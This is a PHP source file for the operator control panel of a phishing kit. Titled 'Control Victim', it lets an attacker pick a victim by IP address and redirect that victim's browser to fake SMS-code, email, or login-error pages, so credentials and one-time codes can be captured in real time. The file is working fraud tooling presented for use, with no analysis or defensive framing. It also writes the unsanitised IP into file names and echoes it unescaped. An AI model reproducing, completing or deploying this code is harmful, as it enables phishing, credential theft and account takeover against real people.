<?php
require '../main.php';
$ip = $_GET['ip'];

if(isset($_POST['go'])){
    $target = $_POST['go'];
    file_put_contents("status_" . $ip . ".txt", $target);
    $res = "✅ Victim redirected to: $target";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Control Victim: <?php echo $ip; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }
        .card { background: #2d2d2d; padding: 25px; border-radius: 15px; max-width: 380px; margin: auto; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        .btn { display: block; width: 100%; padding: 15px; margin: 12px 0; border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .blue { background: #3498db; } .green { background: #2ecc71; } .red { background: #e74c3c; } .gray { background: #95a5a6; }
        .btn:hover { opacity: 0.8; transform: scale(1.02); }
    </style>
</head>
<body>
    <div class="card">
        <h3>Target: <?php echo $ip; ?></h3>
        <?php if(isset($res)) echo "<p style='color:#2ecc71'>$res</p>"; ?>
        <form method="POST">
            <button name="go" value="sms.php" class="btn blue">SEND SMS PAGE</button>
            <button name="go" value="email.php" class="btn green">SEND EMAIL PAGE</button>
            <button name="go" value="login.php" class="btn red">SEND LOGIN ERROR</button>
            <button name="go" value="wait" class="btn gray">RESET TO LOADING</button>
        </form>
    </div>
</body>
</html>